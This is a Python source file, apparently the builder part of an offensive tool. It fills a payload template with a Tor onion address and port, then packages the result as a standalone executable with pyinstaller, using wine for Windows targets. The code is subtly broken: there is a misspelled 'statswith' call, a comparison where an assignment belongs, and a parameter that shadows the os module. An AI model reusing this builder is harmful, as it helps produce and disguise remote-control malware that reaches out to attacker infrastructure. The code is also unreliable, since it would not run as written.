import os

class Generator:
    def __init__(self,payload,port,addr,outfile="payload.py",opts={}):
        self.payload = payload
        self.port = port
        self.addr = addr
        self.outfile = outfile
        self.opts = opts

    def createPaylad(self):
        counter = 0
        f = open(self.outfile,'w')
        for lines in open(self.payload,'r'):
            if lines.statswith("#const"):
                counter = 2
                continue
            if counter == 2:
                f.write("OnionUrl = " + self.addr)
                counter == 1
                continue
            if counter == 1:
                f.write("PORT = " + self.port)
                continue
            f.write(lines)
        f.close()

    def Compile(self):
        c = compiler(self.outfile,'~/',self.payload.split("/")[0])
        
    def handler(self):
        self.createPaylad()
        if self.opts["compile"] == True:
            self.Compile()
        
    

class compiler:

    def __init__(self,infile,dir,os):
        if os == "windows":
            os.system("wine ~/.wine/drive_c/Python27/Scripts/pyinstaller -F --specpath " + dir + " " + infile)
        if os == "linux":
            os.system("pyinstaller -F --specpath " + dir + " " + infile)

    
